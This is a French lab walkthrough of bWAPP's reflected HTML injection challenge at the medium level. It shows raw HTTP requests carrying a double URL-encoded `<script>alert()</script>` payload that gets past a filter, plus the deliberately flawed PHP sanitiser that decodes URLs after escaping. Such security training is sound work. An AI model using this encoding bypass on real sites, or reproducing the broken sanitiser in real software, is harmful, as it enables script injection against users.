# Niveau "Medium"

## Exploitation

L'affichage du prénom et du nom s'effectue ici de la même manière au sein d'une balise `<div></div>` :&#x20;

![](<../../../../../.gitbook/assets/image (17) (1).png>)

Dont voici la requête :&#x20;

```http
GET /bWAPP/htmli_get.php?firstname=prenom%5Blvl+medium%5D&lastname=nom%5Blvl+medium%5D&form=submit HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=41a2ae9ea948edd613914b6d27214575; security_level=1
Connection: close
```

L'affichage des paramètres d'URL se faire directement au sein de la balise `<div></div>` contenant également le formulaire :&#x20;

```html
<div id="main">
  <h1>HTML Injection - Reflected (GET)</h1>
  <p>Enter your first and last name:</p>
  <form action="/bWAPP/htmli_get.php" method="GET">
    <p>
      <label for="firstname">First name:</label><br />
      <input type="text" id="firstname" name="firstname">
    </p>
    <p>
      <label for="lastname">Last name:</label><br />
      <input type="text" id="lastname" name="lastname">
    </p>
    <button type="submit" name="form" value="submit">Go</button>  
  </form>
  <br />
  Welcome prenom[lvl medium] nom[lvl medium]
</div>
```

Cela oblige donc à passer par l'insertion de nouvelles balises afin d'injecter du contenu. Dans ce niveau de difficulté, aucune balise ne semble être interprétée par l'application, que cela soit le classique `<script></script>` :&#x20;

![](<../../../../../.gitbook/assets/image (3).png>)

L'exécution de Javascript dans un attribut HTML :&#x20;

![](<../../../../../.gitbook/assets/image (20) (1).png>)

Ou également l'utilisation de balises customs :&#x20;

![](<../../../../../.gitbook/assets/image (18) (1).png>)

Pour réussir ce challenge il va donc falloir identifier un moyen de transmettre l'information sous une autre forme mais qui sera tout de même interprétée par l'application. Après plusieurs tentatives, l'encodage URL de l'injection semble fonctionner :&#x20;

```http
GET /bWAPP/htmli_get.php?firstname=%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2530%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e&lastname=%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e&form=submit HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=b6b6991fd6ae6e9926d4e8dab4692f15; security_level=1
Connection: close
```

![](<../../../../../.gitbook/assets/image (9) (1).png>)

## Analyse du code source

Après avoir testé que les paramètres sont bien présents, l'affichage s'effectue grâce à un simple `echo` :

{% code title="htmli_get.php" %}
```php
if(isset($_GET["firstname"]) && isset($_GET["lastname"])) {
  $firstname = $_GET["firstname"];
  $lastname = $_GET["lastname"];

  if($firstname == "" or $lastname == "") {
    echo "<font color=\"red\">Please enter both fields...</font>";
  }
  else {
    echo "Welcome " . htmli($firstname) . " " . htmli($lastname);
  }
}
```
{% endcode %}

Les données sont au préalable traitées par la méthode `htmli()` permettant de gérer la difficulté du niveau sélectionné :

{% code title="htmli_get.php" %}
```php
function htmli($data) {

  switch($_COOKIE["security_level"]) {
    case "0" :
      $data = no_check($data);
      break;
    case "1" :
      $data = xss_check_1($data);
      break;
    case "2" :
      $data = xss_check_3($data);
      break;
    default :
      $data = no_check($data);
      break;
  }

  return $data;
}
```
{% endcode %}

Le level "Medium" correspond à la valeur 1, c'est à dire ici à l'exécution de la méthode `xss_check_1()` :&#x20;

{% code title="functions_external.php" %}
```php
function xss_check_1($data) {
    // Converts only "<" and ">" to HTLM entities
    $input = str_replace("<", "&lt;", $data);
    $input = str_replace(">", "&gt;", $input);

    // Failure is an option
    // Bypasses double encoding attacks
    // <script>alert(0)</script>
    // %3Cscript%3Ealert%280%29%3C%2Fscript%3E
    // %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E
    $input = urldecode($input);

    return $input;
}
```
{% endcode %}

La fonction remplace les caractères `<` et `>` par leur équivalent en entité HTML, soit respectivement `&lt` et `&gt`, rendant impossible l'injection de balises HTML. La ligne 12, par contre, effectue un décodage URL avant de retourner la valeur pour affichage. Le contournement ici sera donc d'encoder URL l'injection (en fait à minima les caractères `<` et `>`) qui sera décodée par la fonction `xss_chech_1()`:

```http
GET /bWAPP/htmli_get.php?firstname=%253cscript%253ealert%280%29%253c%2Fscript%253e&lastname=%253cscript%253ealert%281%29%253c%2Fscript%253e&form=submit HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=1596dd4de4ad3324f300dfed9d8523f5; security_level=1
Connection: close
```

![](<../../../../../.gitbook/assets/image (15).png>)
